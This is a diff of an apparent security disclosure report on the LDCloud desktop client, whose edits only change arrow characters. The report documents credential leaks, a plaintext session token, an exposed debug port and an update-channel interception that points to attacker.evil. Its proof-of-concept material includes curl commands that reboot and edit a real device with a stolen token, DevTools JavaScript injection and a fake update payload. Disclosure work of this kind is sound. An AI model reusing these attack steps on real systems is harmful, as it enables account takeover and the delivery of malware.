@@ -10,10 +10,10 @@ Defense-in-Depth Failures Enabling Malware-to-Cloud-Takeover
 LDCloud suffers from **eight layered security failures** that collectively turn a basic malware infection into full cloud infrastructure takeover. An infostealer with read access to `%APPDATA%` and `%LOCALAPPDATA%` (standard malware behavior) can:
 
 1. **Extract cloud storage credentials** from log files
-2. **Harvest session tokens** from plaintext database → **full account takeover + device control**
+2. **Harvest session tokens** from plaintext database -> **full account takeover + device control**
 3. **Read & modify running application state** via exposed debug port
 4. **Escalate to SYSTEM privileges** via EOL Chromium with sandbox disabled
-5. **Execute undetectable MITM** → **update supply chain attack** (fake update dialog verified)
+5. **Execute undetectable MITM** -> **update supply chain attack** (fake update dialog verified)
 6. **Exploit EOL crypto libraries** (OpenSSL 1.0.2 + 1.1.1)
 7. **Access internal debugger** (VConsole in production build)
 8. **Extract hardcoded third-party credentials** from JS bundles
@@ -136,8 +136,8 @@ The app automatically uploads `dump-log-*.zip` to OBS bucket `ld-cloud-xjp`:
 ```
 Enter put_object successfully !
 request_perform object key= pc-client-log/2300231219705678/dump-log-2025-08-01-16-41-54.zip
-→ https://ld-cloud-xjp.obs.ap-southeast-3.myhuaweicloud.com/pc-client-log/2300231219705678/dump-log-2025-08-01-16-41-54.zip
-Leave put_object successfully !   ← HTTP 200
+-> https://ld-cloud-xjp.obs.ap-southeast-3.myhuaweicloud.com/pc-client-log/2300231219705678/dump-log-2025-08-01-16-41-54.zip
+Leave put_object successfully !   <- HTTP 200
 ```
 
 **The dump-log zip contains `obs-sdk-c.run.log` - the same log file that exposes the Authorization header used to upload it.**
@@ -148,7 +148,7 @@ This creates a **self-perpetuating credential leak**:
 3. App uploads `dump-log-*.zip` to OBS bucket using the SAME credentials
 4. Anyone with bucket access can read all historical dump-logs
 5. All dump-logs contain credentials to access the bucket
-6. → Infinite loop: credentials protect credentials that expose credentials
+6. -> Infinite loop: credentials protect credentials that expose credentials
 
 ### Remediation
 1. Rotate all 7 Access Keys immediately
@@ -170,7 +170,7 @@ LDCloud.exe renderer process (PID 38292, captured live):
 "C:\LDCloud\LDCloud.exe" --type=renderer
   --no-sandbox
   --ignore-certificate-errors=1
-  --ignore-certificate-errors=1           ← appears TWICE
+  --ignore-certificate-errors=1           <- appears TWICE
   --remote-debugging-port=8088
   --unsafely-treat-insecure-origin-as-secure
 ```
@@ -210,7 +210,7 @@ Gap:         49 major Chromium releases behind current stable (~140+)
 **With `--no-sandbox`, every single Chromium CVE becomes a direct RCE vector at the LDCloud process privilege level.**
 
 ### Impact
-- **Malware → RCE:** Any malware that lures user to a malicious page in LDCloud's embedded browser gets RCE with user privileges
+- **Malware -> RCE:** Any malware that lures user to a malicious page in LDCloud's embedded browser gets RCE with user privileges
 - **MITM Attack:** `--ignore-certificate-errors` allows transparent traffic interception
 - **Persistence:** Exploit chain can survive reboots via the same CEF configuration
 - **Amplification:** Malware that lands via Chromium exploit can then harvest findings #1, #3, #4
@@ -231,8 +231,8 @@ Gap:         49 major Chromium releases behind current stable (~140+)
 
 ```
 http://localhost:8088/json
-→ WebSocket: ws://localhost:8088/devtools/page/<PAGEID>
-→ Full Chrome DevTools Protocol access
+-> WebSocket: ws://localhost:8088/devtools/page/<PAGEID>
+-> Full Chrome DevTools Protocol access
 ```
 
 ### What Malware Can Harvest via DevTools (Proven)
@@ -282,7 +282,7 @@ pinia._s.get('app').devicePage.allDeviceList
 ```javascript
 // Changed device expiry from June to July in Pinia store
 store.$patch({devicePage: modifiedData})
-// → UI instantly reflects forged expiry date
+// -> UI instantly reflects forged expiry date
 ```
 
 **Step 5:** Execute arbitrary JavaScript persistently:
@@ -292,9 +292,9 @@ Malware can inject code via `Runtime.evaluate` that hooks `window.fetch`/`XMLHtt
 ### Pre-requisites (Why This Matters)
 
 Malware only needs:
-1. Filesystem read access → find `--remote-debugging-port` from process args
-2. Local TCP connection → `localhost:8088`
-3. Basic WebSocket client → full DevTools protocol access
+1. Filesystem read access -> find `--remote-debugging-port` from process args
+2. Local TCP connection -> `localhost:8088`
+3. Basic WebSocket client -> full DevTools protocol access
 
 This is trivial for any malware or local attacker. No privilege escalation needed.
 
@@ -310,7 +310,7 @@ Remove `--remote-debugging-port=8088` from production build. Use compile-time fl
 
 ---
 
-## Finding #4 [CRITICAL] - Session Token in Plaintext SQLite → Account Takeover
+## Finding #4 [CRITICAL] - Session Token in Plaintext SQLite -> Account Takeover
 
 **CVSS:** 8.1 | **CVSS Vector:** AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
 
@@ -398,7 +398,7 @@ curl -X POST "https://ldq.ldcloud.net/api/rest/cph/device/batch-reboot" \
   -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
   -d "uid=23**********7804658d0fc025b***********1128b0&deviceIds=6***809"
 
-→ {"msg":"成功","code":0}  ← Server executed the reboot command
+-> {"msg":"成功","code":0}  <- Server executed the reboot command
 ```
 
 **Post-reboot status confirmed:**
@@ -406,7 +406,7 @@ curl -X POST "https://ldq.ldcloud.net/api/rest/cph/device/batch-reboot" \
 {
   "deviceId": 6***809,
   "deviceStatus": 4,
-  "deviceStatusDesc": "重启中"   ← "Rebooting"
+  "deviceStatusDesc": "重启中"   <- "Rebooting"
 }
 ```
 
@@ -418,10 +418,10 @@ Device 6312247 (Device4/DEX) note field was modified via the same stolen token:
 curl -X POST "https://ldq.ldcloud.net/api/rest/cph/device/batch-edit" \
   -d "uid=23**********78&token=04658d0fc...&deviceIds=6***247&note=HACKED-BY-POC"
 
-→ {"msg":"成功","code":0}
+-> {"msg":"成功","code":0}
 ```
 
-**Before:** `"note":"DEX"` → **After:** `"note":"HACKED-BY-POC-0303471"`
+**Before:** `"note":"DEX"` -> **After:** `"note":"HACKED-BY-POC-0303471"`
 
 The note was then restored to original, confirming full read/write control.
 
@@ -518,7 +518,7 @@ Low (client-side keys, some are public invite links). Included for completeness.
 Attacker on same network (ARP spoof / rogue AP)
   │
   ├─► mitmproxy intercepts CEF HTTPS traffic
-  │     └─► --ignore-certificate-errors → accepts ANY cert (self-signed, wrong host)
+  │     └─► --ignore-certificate-errors -> accepts ANY cert (self-signed, wrong host)
   │
   ├─► Intercept: POST /api/client-version/check-for-updates/pc
   │     └─► Inject fake response:
@@ -529,7 +529,7 @@ Attacker on same network (ARP spoof / rogue AP)
   ├─► Intercept: POST /api/rest/sys/version-json  
   │     └─► Inject mustForce: ["030400"] (current version)
   │
-  └─► LDCloud displays update dialog → user clicks → malware installed
+  └─► LDCloud displays update dialog -> user clicks -> malware installed
 ```
 
 ### PoC Evidence
@@ -537,9 +537,9 @@ Attacker on same network (ARP spoof / rogue AP)
 **Step 1: Certificate validation bypass confirmed**
 
 ```bash
-# Via CEF DevTools → badssl.com test
-self-signed.badssl.com    → HTTP 200  (cert blindly accepted)
-wrong.host.badssl.com     → HTTP 200  (hostname mismatch ignored)
+# Via CEF DevTools -> badssl.com test
+self-signed.badssl.com    -> HTTP 200  (cert blindly accepted)
+wrong.host.badssl.com     -> HTTP 200  (hostname mismatch ignored)
 ```
 
 **Step 2: mitmproxy intercepts and modifies API response**
@@ -547,7 +547,7 @@ wrong.host.badssl.com     → HTTP 200  (hostname mismatch ignored)
 ```
 $ curl -x http://127.0.0.1:8888 https://ldq.ldcloud.net/api/client-version/check-for-updates/pc
 
-→ {"code":0,"data":{"downloadUrl":"https://attacker.evil/LDCloud_PWNED.exe",
+-> {"code":0,"data":{"downloadUrl":"https://attacker.evil/LDCloud_PWNED.exe",
      "versionName":"99.0.0-PWNED","updateType":"force"}}
 ```
 
@@ -555,8 +555,8 @@ $ curl -x http://127.0.0.1:8888 https://ldq.ldcloud.net/api/client-version/check
 
 ```
 Start LDCloud with --proxy-server=127.0.0.1:8888
-→ Update dialog appears: "Version 99.0.0-PWNED"
-→ Download button points to attacker.evil/LDCloud_PWNED.exe
+-> Update dialog appears: "Version 99.0.0-PWNED"
+-> Download button points to attacker.evil/LDCloud_PWNED.exe
 ```
 
 ### PoC Scripts
@@ -577,7 +577,7 @@ Start LDCloud with --proxy-server=127.0.0.1:8888
 2. **CRITICAL:** Remove `--ignore-urlfetcher-cert-requests=1` from network service
 3. Enable certificate pinning for update server (`ldq.ldcloud.net`)
 4. Code-sign the downloaded binary + verify signature before installation
-5. Upgrade Chromium from 91 → latest stable (eliminates known CVEs)
+5. Upgrade Chromium from 91 -> latest stable (eliminates known CVEs)
 
 ---
 
@@ -602,7 +602,7 @@ Start LDCloud with --proxy-server=127.0.0.1:8888
 | 🔥 P0 | Remove `--no-sandbox` + `--ignore-certificate-errors` | Low | **Eliminates RCE + update MITM** |
 | 🔥 P0 | Rotate all 7 OBS Access Keys | Low | Invalidates leaked credentials |
 | 🔥 P0 | Encrypt config.db with DPAPI | Medium | **Prevents proven account takeover** |
-| 🔥 P0 | Upgrade Chromium from 91 → 130+ | Medium | Closes 49 releases of CVEs |
+| 🔥 P0 | Upgrade Chromium from 91 -> 130+ | Medium | Closes 49 releases of CVEs |
 | 🔴 P1 | Fix OBS SDK logging bug | Low | Stops credential leak at source |
 | 🔴 P1 | Implement server-side token validation | Medium | Even if token stolen, limited abuse |
 | 🟡 P2 | Remove remote debugging port | Low | Closes application state access |
